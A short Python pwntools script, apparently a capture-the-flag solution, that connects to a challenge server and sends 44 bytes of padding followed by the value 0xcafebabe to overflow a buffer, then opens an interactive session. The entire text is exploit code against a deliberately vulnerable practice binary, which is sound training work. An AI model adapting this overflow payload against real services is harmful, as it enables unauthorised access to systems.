from pwn import * 
import struct

HOST,PORT = 'chall.csivit.com', 30007
#r = process('./pwn2')
r = remote(HOST,PORT)
pad = b'A' * 44
val = struct.pack('<I',0xcafebabe)
r.sendline(pad+val)
r.interactive()
